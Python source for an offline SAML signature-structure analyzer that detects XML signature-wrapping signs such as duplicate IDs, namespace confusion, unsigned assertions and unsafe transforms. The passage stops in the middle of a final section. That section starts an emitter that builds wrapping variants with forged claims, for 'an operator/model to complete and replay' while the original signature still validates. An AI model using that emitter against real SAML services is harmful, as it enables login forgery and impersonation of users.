#!/usr/bin/env python3
"""Bounded, offline SAML binding and XML-signature-structure analyzer.

The analyzer decodes saved SAML artifacts, parses their XML without DTDs or
entities, and compares the nodes selected by ``ds:Reference`` with the
Response/Assertion nodes an application might consume.  It deliberately does
*not* verify XML signatures, resolve external references, download schemas or
certificates, or execute transforms.

Examples::

    webauth_saml_xsw.py response.txt --binding auto --pretty
    webauth_saml_xsw.py response.xml --file --binding xml

The JSON result always records ``offline_only=true`` and
``network_requests=0``.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import copy
import hashlib
import json
import re
import sys
import threading
import urllib.parse
import zlib
from pathlib import Path
from typing import Any
from xml.etree import ElementTree as ET


MAX_ARTIFACT_BYTES = 2 * 1024 * 1024
MAX_XML_BYTES = 1024 * 1024
MAX_ELEMENTS = 8192
MAX_DEPTH = 64
MAX_ATTRIBUTES = 32_768
MAX_ATTRIBUTE_BYTES = 64 * 1024
MAX_REFERENCES = 256
MAX_CERT_BYTES = 128 * 1024

SAML_ASSERTION_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAML_PROTOCOL_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"
XML_NS = "http://www.w3.org/XML/1998/namespace"

_PREFIXES = {
    SAML_ASSERTION_NS: "saml",
    SAML_PROTOCOL_NS: "samlp",
    DS_NS: "ds",
    XML_NS: "xml",
}
_DTD_RE = re.compile(br"<!\s*(?:DOCTYPE|ENTITY)\b", re.I)
_BAD_PERCENT_RE = re.compile(r"%(?![0-9A-Fa-f]{2})")
_BASE64_RE = re.compile(r"^[A-Za-z0-9+/]*={0,2}$")

_SAFE_TRANSFORMS = frozenset({
    "http://www.w3.org/2000/09/xmldsig#enveloped-signature",
    "http://www.w3.org/2001/10/xml-exc-c14n#",
    "http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
    "http://www.w3.org/TR/2001/REC-xml-c14n-20010315",
    "http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments",
    "http://www.w3.org/2006/12/xml-c14n11",
    "http://www.w3.org/2006/12/xml-c14n11#WithComments",
})


class WebauthSamlError(ValueError):
    """The bounded saved artifact is malformed, ambiguous, or unsupported."""


def _as_bytes(value: object, *, label: str, limit: int) -> bytes:
    if isinstance(value, str):
        try:
            raw = value.encode("utf-8")
        except UnicodeEncodeError as exc:
            raise WebauthSamlError(f"{label} is not valid UTF-8 text") from exc
    elif isinstance(value, (bytes, bytearray, memoryview)):
        raw = bytes(value)
    else:
        raise WebauthSamlError(f"{label} must be text or bytes")
    if not raw or len(raw) > limit:
        raise WebauthSamlError(f"{label} is empty or exceeds {limit} bytes")
    return raw


def _as_text(value: object, *, label: str, limit: int) -> str:
    raw = _as_bytes(value, label=label, limit=limit)
    try:
        return raw.decode("utf-8", "strict")
    except UnicodeDecodeError as exc:
        raise WebauthSamlError(f"{label} is not UTF-8") from exc


def _form_decode(value: str, *, label: str) -> str:
    if _BAD_PERCENT_RE.search(value):
        raise WebauthSamlError(f"{label} has malformed percent encoding")
    try:
        raw = urllib.parse.unquote_to_bytes(value.replace("+", " "))
        return raw.decode("utf-8", "strict")
    except (UnicodeDecodeError, UnicodeEncodeError, ValueError) as exc:
        raise WebauthSamlError(f"{label} is not valid form-encoded UTF-8") from exc


def _query_text(text: str) -> str | None:
    """Return a possible query/form body, without following or requesting a URL."""
    if "?" not in text:
        return text if "=" in text else None
    try:
        parsed = urllib.parse.urlsplit(text)
    except ValueError as exc:
        raise WebauthSamlError("artifact URL/query is malformed") from exc
    return parsed.query


def _extract_parameter(text: str, requested: str | None) -> tuple[str, str] | None:
    query = _query_text(text.strip())
    if query is None:
        return None
    if len(query.encode("utf-8")) > MAX_ARTIFACT_BYTES:
        raise WebauthSamlError("form/query artifact exceeds cap")
    wanted = requested or ""
    if wanted and wanted not in ("SAMLRequest", "SAMLResponse"):
        raise WebauthSamlError("parameter must be SAMLRequest or SAMLResponse")
    found: list[tuple[str, str]] = []
    for piece in query.split("&"):
        if not piece:
            continue
        key_raw, separator, value_raw = piece.partition("=")
        if not separator:
            continue
        key = _form_decode(key_raw, label="form parameter name")
        if key in ("SAMLRequest", "SAMLResponse") and (not wanted or key == wanted):
            found.append((key, _form_decode(value_raw, label=key)))
    if len(found) > 1:
        raise WebauthSamlError("artifact contains multiple candidate SAML parameters")
    return found[0] if found else None


def _base64_decode(value: str, *, label: str) -> bytes:
    compact = "".join(value.split())
    if not compact or len(compact) > MAX_ARTIFACT_BYTES * 2:
        raise WebauthSamlError(f"{label} base64 is empty or over cap")
    if not _BASE64_RE.fullmatch(compact):
        raise WebauthSamlError(f"{label} is not standard base64")
    if "=" in compact[:-2]:
        raise WebauthSamlError(f"{label} has misplaced base64 padding")
    compact += "=" * (-len(compact) % 4)
    try:
        raw = base64.b64decode(compact, validate=True)
    except (ValueError, binascii.Error) as exc:
        raise WebauthSamlError(f"{label} has invalid base64") from exc
    if not raw or len(raw) > MAX_ARTIFACT_BYTES:
        raise WebauthSamlError(f"decoded {label} is empty or over cap")
    return raw


def _raw_inflate(value: bytes) -> bytes:
    try:
        inflater = zlib.decompressobj(-15)
        out = inflater.decompress(value, MAX_XML_BYTES + 1)
        if len(out) > MAX_XML_BYTES or inflater.unconsumed_tail:
            raise WebauthSamlError("Redirect DEFLATE output exceeds XML cap")
        out += inflater.flush(MAX_XML_BYTES + 1 - len(out))
    except WebauthSamlError:
        raise
    except (ValueError, zlib.error) as exc:
        raise WebauthSamlError("invalid raw-DEFLATE SAML artifact") from exc
    if len(out) > MAX_XML_BYTES:
        raise WebauthSamlError("Redirect DEFLATE output exceeds XML cap")
    if not inflater.eof or inflater.unused_data or inflater.unconsumed_tail:
        raise WebauthSamlError("Redirect DEFLATE stream is truncated or has trailing data")
    return out


def _looks_like_xml(raw: bytes) -> bool:
    return raw.lstrip().startswith(b"<")


def _decode_artifact(value: object, binding: str, parameter: str | None) -> dict[str, Any]:
    raw_input = _as_bytes(value, label="SAML artifact", limit=MAX_ARTIFACT_BYTES)
    normalized = binding.casefold().replace("_", "-") if isinstance(binding, str) else ""
    aliases = {"xml": "xml", "raw": "xml", "post": "post", "http-post": "post",
               "redirect": "redirect", "http-redirect": "redirect", "auto": "auto"}
    mode = aliases.get(normalized)
    if mode is None:
        raise WebauthSamlError("binding must be auto, xml, post, or redirect")

    if mode == "xml" or (mode == "auto" and _looks_like_xml(raw_input)):
        xml = raw_input
        detected = "xml"
        selected_parameter = parameter
    else:
        text = _as_text(raw_input, label="encoded SAML artifact", limit=MAX_ARTIFACT_BYTES)
        extracted = _extract_parameter(text, parameter)
        if extracted is not None:
            selected_parameter, encoded = extracted
        else:
            selected_parameter = parameter
            # A bare HTTP-POST/auto body is already standard base64 (whose
            # alphabet includes "+"); form/url-decoding it would delete "+"
            # as spaces, so decode it as base64 directly.
            encoded = text.strip()
        decoded = _base64_decode(encoded, label=selected_parameter or "SAML artifact")
        if mode == "post":
            xml, detected = decoded, "http-post"
        elif mode == "redirect":
            xml, detected = _raw_inflate(decoded), "http-redirect"
        elif _looks_like_xml(decoded):
            xml, detected = decoded, "http-post"
        else:
            xml, detected = _raw_inflate(decoded), "http-redirect"

    if not xml or len(xml) > MAX_XML_BYTES:
        raise WebauthSamlError(f"decoded XML is empty or exceeds {MAX_XML_BYTES} bytes")
    if not _looks_like_xml(xml):
        raise WebauthSamlError("decoded artifact is not XML")
    return {
        "xml": xml,
        "binding": detected,
        "parameter": selected_parameter,
        "encoded_bytes": len(raw_input),
        "xml_bytes": len(xml),
    }


def decode_saml_artifact(value: object, *, binding: str = "auto",
                         parameter: str | None = None) -> dict[str, Any]:
    """Decode raw XML, HTTP-POST base64, or HTTP-Redirect raw-DEFLATE data.

    This public boundary converts every malformed-input failure into
    :class:`WebauthSamlError`.
    """
    try:
        return _decode_artifact(value, binding, parameter)
    except WebauthSamlError:
        raise
    except Exception as exc:  # fail closed at the public untrusted-input boundary
        raise WebauthSamlError("unable to decode SAML artifact") from exc


def _split_tag(tag: object) -> tuple[str, str]:
    if not isinstance(tag, str):
        return "", ""
    if tag.startswith("{") and "}" in tag:
        namespace, local = tag[1:].split("}", 1)
        return namespace, local
    return "", tag


def _qname(tag: object) -> str:
    namespace, local = _split_tag(tag)
    prefix = _PREFIXES.get(namespace)
    return f"{prefix}:{local}" if prefix else f"{{{namespace}}}{local}" if namespace else local


def _local(tag: object) -> str:
    return _split_tag(tag)[1]


def _namespace(tag: object) -> str:
    return _split_tag(tag)[0]


def _attr(element: ET.Element, local_name: str) -> str | None:
    rows = [value for name, value in element.attrib.items()
            if _local(name).casefold() == local_name.casefold()]
    return rows[0] if len(rows) == 1 else None


def _direct_text(element: ET.Element, local_name: str) -> str | None:
    for child in element:
        if (_local(child.tag) == local_name
                and _namespace(child.tag) == SAML_ASSERTION_NS):
            text = (child.text or "").strip()
            return text or None
    return None


def _descendant_texts(element: ET.Element, local_name: str) -> list[str]:
    values: list[str] = []
    for child in element.iter():
        if (_local(child.tag) == local_name
                and _namespace(child.tag) == SAML_ASSERTION_NS):
            text = (child.text or "").strip()
            if text:
                values.append(text)
    return values


def _finding(code: str, severity: str, message: str, **evidence: Any) -> dict[str, Any]:
    row: dict[str, Any] = {"code": code, "severity": severity, "message": message}
    if evidence:
        row["evidence"] = evidence
    return row


def _parse_tree(xml: bytes) -> ET.Element:
    if _DTD_RE.search(xml):
        raise WebauthSamlError("DTD and ENTITY declarations are forbidden")
    try:
        root = ET.fromstring(xml)
    except (ET.ParseError, RecursionError, ValueError) as exc:
        raise WebauthSamlError("SAML XML is not well formed") from exc
    if not isinstance(root.tag, str):
        raise WebauthSamlError("SAML XML root is not an element")
    return root


def _index_tree(root: ET.Element) -> tuple[list[dict[str, Any]], dict[ET.Element, int],
                                            dict[int, int | None]]:
    records: list[dict[str, Any]] = []
    by_element: dict[ET.Element, int] = {}
    parents: dict[int, int | None] = {}
    attributes = 0
    stack: list[tuple[ET.Element, int | None, str, int]] = [(root, None, f"/{_qname(root.tag)}[1]", 0)]
    while stack:
        element, parent_index, path, depth = stack.pop()
        if depth > MAX_DEPTH:
            raise WebauthSamlError(f"XML depth exceeds {MAX_DEPTH}")
        if len(records) >= MAX_ELEMENTS:
            raise WebauthSamlError(f"XML element count exceeds {MAX_ELEMENTS}")
        attributes += len(element.attrib)
        if attributes > MAX_ATTRIBUTES:
            raise WebauthSamlError(f"XML attribute count exceeds {MAX_ATTRIBUTES}")
        for name, value in element.attrib.items():
            if len(str(name).encode("utf-8")) + len(value.encode("utf-8")) > MAX_ATTRIBUTE_BYTES:
                raise WebauthSamlError("XML attribute exceeds byte cap")
        index = len(records)
        by_element[element] = index
        parents[index] = parent_index
        ids = []
        element_namespace = _namespace(element.tag)
        for name, value in element.attrib.items():
            namespace, local = _split_tag(name)
            if local.casefold() != "id":
                continue
            normative_saml = (
                namespace == "" and local == "ID"
                and element_namespace in {SAML_ASSERTION_NS, SAML_PROTOCOL_NS}
            )
            normative_xml = namespace == XML_NS and local == "id"
            ids.append({
                "attribute": _qname(name),
                "value": value,
                "normative": normative_saml or normative_xml,
                "kind": (
                    "saml-ID" if normative_saml else
                    "xml:id" if normative_xml else
                    "nonstandard-id-candidate"
                ),
            })
        records.append({
            "index": index,
            "tag": _qname(element.tag),
            "local_name": _local(element.tag),
            "namespace": _namespace(element.tag),
            "path": path,
            "parent_index": parent_index,
            "ids": ids,
        })
        children = [child for child in element if isinstance(child.tag, str)]
        ordinals: list[int] = []
        counts: dict[str, int] = {}
        for child in children:
            label = _qname(child.tag)
            counts[label] = counts.get(label, 0) + 1
            ordinals.append(counts[label])
        for child, ordinal in reversed(list(zip(children, ordinals))):
            child_path = f"{path}/{_qname(child.tag)}[{ordinal}]"
            stack.append((child, index, child_path, depth + 1))
    return records, by_element, parents


def _ancestor_indexes(index: int, parents: dict[int, int | None]) -> list[int]:
    result: list[int] = []
    current = parents.get(index)
    while current is not None:
        result.append(current)
        current = parents.get(current)
    return result


def _inside(index: int, ancestor: int, parents: dict[int, int | None]) -> bool:
    current: int | None = index
    while current is not None:
        if current == ancestor:
            return True
        current = parents.get(current)
    return False


def _reference_signature(index: int, records: list[dict[str, Any]],
                         parents: dict[int, int | None]) -> int | None:
    """Return the real ds:Signature owning a Reference under ds:SignedInfo.

    Local-name matches and References elsewhere under Signature are deliberately
    excluded: neither is an XMLDSig SignedInfo reference edge.
    """

    current = parents.get(index)
    while current is not None:
        record = records[current]
        if record["local_name"] == "SignedInfo" and record["namespace"] == DS_NS:
            signature = parents.get(current)
            if signature is None:
                return None
            owner = records[signature]
            if owner["local_name"] == "Signature" and owner["namespace"] == DS_NS:
                return signature
            return None
        if record["local_name"] == "Signature" and record["namespace"] == DS_NS:
            return None
        current = parents.get(current)
    return None


def _certificate_fingerprints(signature: ET.Element) -> tuple[list[str], int]:
    fingerprints: list[str] = []
    count = 0
    for node in signature.iter():
        if _local(node.tag) != "X509Certificate" or _namespace(node.tag) != DS_NS:
            continue
        count += 1
        text = "".join((node.text or "").split())
        if not text or len(text) > MAX_CERT_BYTES * 2:
            continue
        try:
            der = base64.b64decode(text + "=" * (-len(text) % 4), validate=True)
        except (ValueError, binascii.Error):
            continue
        if 0 < len(der) <= MAX_CERT_BYTES:
            fingerprints.append(hashlib.sha256(der).hexdigest())
    return fingerprints, count


def _assertion_record(element: ET.Element, record: dict[str, Any]) -> dict[str, Any]:
    conditions: list[dict[str, Any]] = []
    confirmations: list[dict[str, Any]] = []
    attributes: list[dict[str, Any]] = []
    for child in element.iter():
        if _namespace(child.tag) != SAML_ASSERTION_NS:
            continue
        local = _local(child.tag)
        if local == "Conditions":
            conditions.append({
                "not_before": _attr(child, "NotBefore"),
                "not_on_or_after": _attr(child, "NotOnOrAfter"),
                "audiences": _descendant_texts(child, "Audience"),
            })
        elif local == "SubjectConfirmationData":
            confirmations.append({
                "recipient": _attr(child, "Recipient"),
                "in_response_to": _attr(child, "InResponseTo"),
                "not_on_or_after": _attr(child, "NotOnOrAfter"),
                "address": _attr(child, "Address"),
            })
        elif local == "Attribute":
            attributes.append({
                "name": _attr(child, "Name"),
                "name_format": _attr(child, "NameFormat"),
                "values": _descendant_texts(child, "AttributeValue"),
            })
    return {
        "index": record["index"],
        "path": record["path"],
        "ids": record["ids"],
        "issuer": _direct_text(element, "Issuer"),
        "name_ids": _descendant_texts(element, "NameID"),
        "conditions": conditions,
        "subject_confirmations": confirmations,
        "audiences": _descendant_texts(element, "Audience"),
        "attributes": attributes,
    }


def _response_record(element: ET.Element, record: dict[str, Any],
                     by_element: dict[ET.Element, int], records: list[dict[str, Any]]) -> dict[str, Any]:
    assertions = [records[by_element[node]]["path"] for node in element
                  if (_local(node.tag) == "Assertion"
                      and _namespace(node.tag) == SAML_ASSERTION_NS)]
    signatures = [records[by_element[node]]["path"] for node in element
                  if _local(node.tag) == "Signature" and _namespace(node.tag) == DS_NS]
    return {
        "index": record["index"],
        "path": record["path"],
        "ids": record["ids"],
        "issuer": _direct_text(element, "Issuer"),
        "destination": _attr(element, "Destination"),
        "in_response_to": _attr(element, "InResponseTo"),
        "issue_instant": _attr(element, "IssueInstant"),
        "direct_assertions": assertions,
        "direct_signatures": signatures,
    }


def _analyze(xml: bytes, decoded: dict[str, Any]) -> dict[str, Any]:
    root = _parse_tree(xml)
    records, by_element, parents = _index_tree(root)
    elements = list(by_element)
    findings: list[dict[str, Any]] = []

    # Keep standards-recognized ID attributes separate from looser candidates
    # that vulnerable XML stacks sometimes treat as IDs.  Only the normative
    # map is allowed to establish signature coverage.
    id_map: dict[str, list[int]] = {}
    id_candidate_map: dict[str, list[int]] = {}
    for record in records:
        if len(record["ids"]) > 1:
            findings.append(_finding(
                "multiple_id_attributes", "high", "one element carries multiple ID-like attributes",
                path=record["path"], ids=record["ids"],
            ))
        for item in record["ids"]:
            id_candidate_map.setdefault(item["value"], []).append(record["index"])
            if item["normative"]:
                id_map.setdefault(item["value"], []).append(record["index"])
            else:
                findings.append(_finding(
                    "nonstandard_id_attribute", "high",
                    "an ID-like attribute is not a normative SAML ID or xml:id",
                    path=record["path"], attribute=item["attribute"], value=item["value"],
                ))
    for value, indexes in id_map.items():
        if len(indexes) > 1:
            findings.append(_finding(
                "duplicate_id", "critical", "a normative ID value identifies multiple XML elements",
                id=value, paths=[records[index]["path"] for index in indexes],
            ))
    for value, indexes in id_candidate_map.items():
        candidates = list(dict.fromkeys(indexes))
        normative = list(dict.fromkeys(id_map.get(value, ())))
        if len(candidates) > len(normative) and len(candidates) > 1:
            findings.append(_finding(
                "id_resolution_differential", "critical",
                "nonstandard ID handling can resolve this value to a different element",
                id=value,
                normative_paths=[records[index]["path"] for index in normative],
                candidate_paths=[records[index]["path"] for index in candidates],
            ))

    expected_namespaces = {
        "Response": {SAML_PROTOCOL_NS},
        "Assertion": {SAML_ASSERTION_NS},
        "Issuer": {SAML_ASSERTION_NS},
        "NameID": {SAML_ASSERTION_NS},
        "Conditions": {SAML_ASSERTION_NS},
        "Audience": {SAML_ASSERTION_NS},
        "Signature": {DS_NS},
        "SignedInfo": {DS_NS},
        "Reference": {DS_NS},
        "Transform": {DS_NS},
        "DigestMethod": {DS_NS},
        "SignatureMethod": {DS_NS},
        "CanonicalizationMethod": {DS_NS},
        "KeyInfo": {DS_NS},
        "X509Certificate": {DS_NS},
        "Object": {DS_NS},
    }
    lookalikes = [
        {"path": row["path"], "local_name": row["local_name"], "namespace": row["namespace"]}
        for row in records
        if row["local_name"] in expected_namespaces
        and row["namespace"] not in expected_namespaces[row["local_name"]]
    ]
    if lookalikes:
        findings.append(_finding(
            "namespace_confusion", "critical",
            "security-sensitive local names occur in foreign or missing namespaces",
            count=len(lookalikes), elements=lookalikes[:128],
        ))

    response_indexes = [row["index"] for row in records
                        if row["local_name"] == "Response" and row["namespace"] == SAML_PROTOCOL_NS]
    assertion_indexes = [row["index"] for row in records
                         if row["local_name"] == "Assertion" and row["namespace"] == SAML_ASSERTION_NS]
    signature_indexes = [row["index"] for row in records
                         if row["local_name"] == "Signature" and row["namespace"] == DS_NS]
    reference_indexes = [row["index"] for row in records
                         if row["local_name"] == "Reference" and row["namespace"] == DS_NS]
    if len(reference_indexes) > MAX_REFERENCES:
        raise WebauthSamlError(f"signature Reference count exceeds {MAX_REFERENCES}")

    reference_owners = {
        index: _reference_signature(index, records, parents) for index in reference_indexes
    }
    for index, owner in reference_owners.items():
        if owner is None:
            findings.append(_finding(
                "reference_outside_signed_info", "critical",
                "ds:Reference is not under ds:SignedInfo owned by a real ds:Signature",
                reference_path=records[index]["path"],
            ))

    if len(response_indexes) > 1:
        findings.append(_finding(
            "multiple_responses", "high", "document contains multiple Response elements",
            paths=[records[index]["path"] for index in response_indexes],
        ))
    if len(assertion_indexes) > 1:
        findings.append(_finding(
            "multiple_assertions", "high", "document contains multiple Assertion elements",
            paths=[records[index]["path"] for index in assertion_indexes],
        ))
    for code, indexes, name in (("nested_response", response_indexes, "Response"),
                                ("nested_assertion", assertion_indexes, "Assertion")):
        expected_namespace = SAML_PROTOCOL_NS if name == "Response" else SAML_ASSERTION_NS
        for index in indexes:
            if any(records[parent]["local_name"] == name
                   and records[parent]["namespace"] == expected_namespace
                   for parent in _ancestor_indexes(index, parents)):
                findings.append(_finding(
                    code, "critical", f"{name} is nested inside another {name}",
                    path=records[index]["path"],
                ))

    references: list[dict[str, Any]] = []
    signatures: list[dict[str, Any]] = []
    uniquely_signed: dict[int, list[dict[str, Any]]] = {}
    for signature_index in signature_indexes:
        signature = elements[signature_index]
        owner_index = parents.get(signature_index)
        c14n = next((_attr(node, "Algorithm") for node in signature.iter()
                     if (_local(node.tag) == "CanonicalizationMethod"
                         and _namespace(node.tag) == DS_NS)), None)
        signature_method = next((_attr(node, "Algorithm") for node in signature.iter()
                                 if (_local(node.tag) == "SignatureMethod"
                                     and _namespace(node.tag) == DS_NS)), None)
        key_info = any(_local(node.tag) == "KeyInfo" and _namespace(node.tag) == DS_NS
                       for node in signature.iter())
        fingerprints, certificate_count = _certificate_fingerprints(signature)
        signature_refs: list[dict[str, Any]] = []
        for reference_index in reference_indexes:
            if reference_owners[reference_index] != signature_index:
                continue
            reference = elements[reference_index]
            uri = _attr(reference, "URI")
            transforms = [_attr(node, "Algorithm") for node in reference.iter()
                          if _local(node.tag) == "Transform" and _namespace(node.tag) == DS_NS]
            digest_method = next((_attr(node, "Algorithm") for node in reference.iter()
                                  if (_local(node.tag) == "DigestMethod"
                                      and _namespace(node.tag) == DS_NS)), None)
            target_indexes: list[int] = []
            candidate_indexes: list[int] = []
            status: str
            if uri is None or uri == "":
                status = "empty"
                findings.append(_finding(
                    "empty_reference", "critical", "Signature Reference is absent or empty",
                    signature_path=records[signature_index]["path"],
                    reference_path=records[reference_index]["path"],
                ))
            elif not uri.startswith("#"):
                status = "external"
                findings.append(_finding(
                    "external_reference", "critical", "Signature Reference is not same-document",
                    uri=uri, reference_path=records[reference_index]["path"],
                ))
            else:
                identifier = uri[1:]
                target_indexes = list(dict.fromkeys(id_map.get(identifier, ())))
                candidate_indexes = list(dict.fromkeys(id_candidate_map.get(identifier, ())))
                if not target_indexes:
                    if candidate_indexes:
                        status = "nonstandard-id-only"
                        findings.append(_finding(
                            "nonstandard_reference_target", "critical",
                            "Signature Reference resolves only under nonstandard ID handling",
                            uri=uri, reference_path=records[reference_index]["path"],
                            candidate_paths=[records[index]["path"] for index in candidate_indexes],
                        ))
                    else:
                        status = "unresolved"
                        findings.append(_finding(
                            "unresolved_reference", "critical", "Signature Reference target does not exist",
                            uri=uri, reference_path=records[reference_index]["path"],
                        ))
                elif len(target_indexes) > 1:
                    status = "ambiguous"
                    findings.append(_finding(
                        "ambiguous_reference", "critical", "Signature Reference resolves to multiple elements",
                        uri=uri, target_paths=[records[index]["path"] for index in target_indexes],
                    ))
                else:
                    status = "unique"
            for algorithm in transforms:
                if algorithm not in _SAFE_TRANSFORMS:
                    severe = bool(algorithm and ("xpath" in algorithm.casefold() or "xslt" in algorithm.casefold()))
                    findings.append(_finding(
                        "risky_transform", "critical" if severe else "high",
                        "Signature Reference declares a transform that is not in the inert safe catalog",
                        algorithm=algorithm, reference_path=records[reference_index]["path"],
                    ))
            for role, algorithm in (("digest", digest_method), ("signature", signature_method),
                                    ("canonicalization", c14n)):
                if isinstance(algorithm, str) and "sha1" in algorithm.casefold():
                    findings.append(_finding(
                        "sha1_algorithm", "high", "XML signature structure declares SHA-1",
                        role=role, algorithm=algorithm, signature_path=records[signature_index]["path"],
                    ))
            row = {
                "index": reference_index,
                "path": records[reference_index]["path"],
                "signature_index": signature_index,
                "uri": uri,
                "status": status,
                "target_indexes": target_indexes,
                "target_paths": [records[index]["path"] for index in target_indexes],
                "candidate_target_indexes": candidate_indexes,
                "candidate_target_paths": [records[index]["path"] for index in candidate_indexes],
                "transforms": transforms,
                "digest_method": digest_method,
            }
            references.append(row)
            signature_refs.append(row)
            if status == "unique":
                uniquely_signed.setdefault(target_indexes[0], []).append(row)
        signatures.append({
            "index": signature_index,
            "path": records[signature_index]["path"],
            "namespace": records[signature_index]["namespace"],
            "owner_index": owner_index,
            "owner_path": records[owner_index]["path"] if owner_index is not None else None,
            "canonicalization_method": c14n,
            "signature_method": signature_method,
            "key_info_present": key_info,
            "x509_certificate_count": certificate_count,
            "x509_sha256": fingerprints,
            "references": [row["index"] for row in signature_refs],
        })

    for target_index, edges in uniquely_signed.items():
        hidden = [ancestor for ancestor in [target_index] + _ancestor_indexes(target_index, parents)
                  if (records[ancestor]["local_name"] == "Object" and records[ancestor]["namespace"] == DS_NS)
                  or (records[ancestor]["local_name"] == "Extensions"
                      and records[ancestor]["namespace"] == SAML_PROTOCOL_NS)]
        if hidden:
            findings.append(_finding(
                "signed_node_hidden", "critical",
                "a uniquely referenced signed node is under ds:Object or Extensions",
                target_path=records[target_index]["path"],
                container_paths=[records[index]["path"] for index in hidden],
                reference_paths=[edge["path"] for edge in edges],
            ))

    responses = [_response_record(elements[index], records[index], by_element, records)
                 for index in response_indexes]
    assertions = [_assertion_record(elements[index], records[index]) for index in assertion_indexes]
    consumed_candidates: list[dict[str, Any]] = []
    signed_authentication_targets = [
        index for index in uniquely_signed
        if ((records[index]["local_name"] == "Response"
             and records[index]["namespace"] == SAML_PROTOCOL_NS)
            or (records[index]["local_name"] == "Assertion"
                and records[index]["namespace"] == SAML_ASSERTION_NS))
    ]
    for assertion in assertions:
        index = assertion["index"]
        covering = [target for target in signed_authentication_targets if _inside(index, target, parents)]
        exact = index in uniquely_signed
        signature_paths = sorted({
            records[edge["signature_index"]]["path"]
            for target in covering for edge in uniquely_signed.get(target, ())
        })
        coverage = "assertion" if exact else "response" if covering else "none"
        candidate = {
            "document_order": len(consumed_candidates),
            "path": assertion["path"],
            "ids": assertion["ids"],
            "issuer": assertion["issuer"],
            "name_ids": assertion["name_ids"],
            "audiences": assertion["audiences"],
            "signature_coverage": coverage,
            "signed_target_paths": [records[target]["path"] for target in covering],
            "signature_paths": signature_paths,
        }
        consumed_candidates.append(candidate)
        if not covering:
            findings.append(_finding(
                "assertion_outside_signed_subtree", "critical",
                "an Assertion is outside every uniquely referenced Response/Assertion subtree",
                assertion_path=assertion["path"], name_ids=assertion["name_ids"],
            ))
    covered = [row["path"] for row in consumed_candidates if row["signature_coverage"] != "none"]
    uncovered = [row["path"] for row in consumed_candidates if row["signature_coverage"] == "none"]
    if covered and uncovered:
        findings.append(_finding(
            "signed_consumed_node_mismatch_candidate", "critical",
            "document presents both signature-covered and uncovered Assertion consumption candidates",
            covered_assertions=covered, uncovered_assertions=uncovered,
        ))

    graph_edges = [{
        "signature_path": records[row["signature_index"]]["path"],
        "reference_path": row["path"],
        "uri": row["uri"],
        "status": row["status"],
        "target_paths": row["target_paths"],
    } for row in references]
    findings.sort(key=lambda row: (row["severity"], row["code"], json.dumps(row.get("evidence", {}), sort_keys=True)))
    return {
        "binding": decoded["binding"],
        "parameter": decoded["parameter"],
        "xml_bytes": decoded["xml_bytes"],
        "root": records[0],
        "counts": {
            "elements": len(records),
            "responses": len(responses),
            "assertions": len(assertions),
            "signatures": len(signatures),
            "references": len(reference_indexes),
        },
        "responses": responses,
        "assertions": assertions,
        "signatures": signatures,
        "references": references,
        "ignored_references": [
            records[index]["path"] for index, owner in reference_owners.items() if owner is None
        ],
        "reference_graph": graph_edges,
        "consumed_candidates": consumed_candidates,
        "findings": findings,
        "verified": False,
        "cryptographic_verification": "not_performed",
        "transforms_executed": 0,
        "offline_only": True,
        "network_requests": 0,
    }


def analyze_saml_artifact(value: object, *, binding: str = "auto",
                          parameter: str | None = None) -> dict[str, Any]:
    """Decode and structurally analyze one saved SAML artifact offline."""
    try:
        decoded = _decode_artifact(value, binding, parameter)
        return _analyze(decoded["xml"], decoded)
    except WebauthSamlError:
        raise
    except Exception as exc:  # one declared error boundary for all hostile input
        raise WebauthSamlError("unable to analyze SAML artifact safely") from exc


# --- XML signature-wrapping (XSW) variant emitter ----------------------------
# Given a saved signed SAML document, emit candidate signature-wrapping variants
# for an operator/model to complete and replay.  The emitter never verifies a
# signature, resolves a reference, fetches anything, or submits.  It builds each
# variant from an independent deepcopy of the parsed tree (no DTD/entities) and
# serializes with the standard SAML/XMLDSig prefixes.  The forged node is left
# structurally intact but stripped of any enveloped signature and marked with a
# comment: the caller fills the forged claims and, under inclusive C14N, splices
# the original signed element's exact bytes (`signed_element`) so the real
# signature still validates.

_FORGED_ID_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.\-]{0,127}$")
_AUTH_LOCALS = {"Response": SAML_PROTOCOL_NS, "Assertion": SAML_ASSERTION_NS}


class _Tree:
    """A re-indexable parse: stable DFS indexes survive deepcopy."""

    def __init__(self, root: ET.Element) -> None:
        self.root = root
        self.records, self.by_element, self.parents = _index_tree(root)
        self.elements = list(self.by_element)

    def element(self, index: int) -> ET.Element:
        return self.elements[index]

    def clone(self) -> "_Tree":
        return _Tree(copy.deepcopy(self.root))


def _normative_id_map(records: list[dict[str, Any]]) -> dict[str, list[int]]:
    id_map: dict[str, list[int]] = {}
    for record in records:
        for item in record["ids"]:
            if item["normative"]:
                id_map.setdefault(item["value"], []).append(record["index"])
    return id_map


def _id_key_for_value(element: ET.Element, value: str) -> str | None:
    for name, current in element.attrib.items():
        if current == value and _local(name).casefold() == "id":
            return name
    return None


def _wrapping_anchor(tree: _Tree) -> dict[str, Any]:
    """Locate the one signature whose unique same-document reference covers a
    Response/Assertion.  Fail loudly if zero or several such anchors exist."""
    records, parents, elements = tree.records, tree.parents, tree.elements
    id_map = _normative_id_map(records)
    reference_indexes = [row["index"] for row in records
                         if row["local_name"] == "Reference" and row["namespace"] == DS_NS]
    if len(reference_indexes) > MAX_REFERENCES:
        raise WebauthSamlError(f"signature Reference count exceeds {MAX_REFERENCES}")
    anchors: list[dict[str, Any]] = []
    for ref_index in reference_indexes:
        owner = _reference_signature(ref_index, records, parents)
        if owner is None:
            continue
        uri = _attr(elements[ref_index], "URI")
        if not isinstance(uri, str) or not uri.startswith("#"):
            continue
        targets = list(dict.fromkeys(id_map.get(uri[1:], ())))
        if len(targets) != 1:
            continue
        target_index = targets[0]
        local = records[target_index]["local_name"]
        namespace = records[target_index]["namespace"]
        if _AUTH_LOCALS.get(local) != namespace:
            continue
        anchors.append({
            "signature_index": owner,
            "reference_index": ref_index,
            "target_index": target_index,
            "uri": uri,
            "id_value": uri[1:],
            "target_local": local,
        })
    if not anchors:
        raise WebauthSamlError(
            "no uniquely-signed Response or Assertion to wrap "
            "(need one ds:Signature with a unique same-document reference to an auth element)")
    if len(anchors) > 1:
        raise WebauthSamlError(
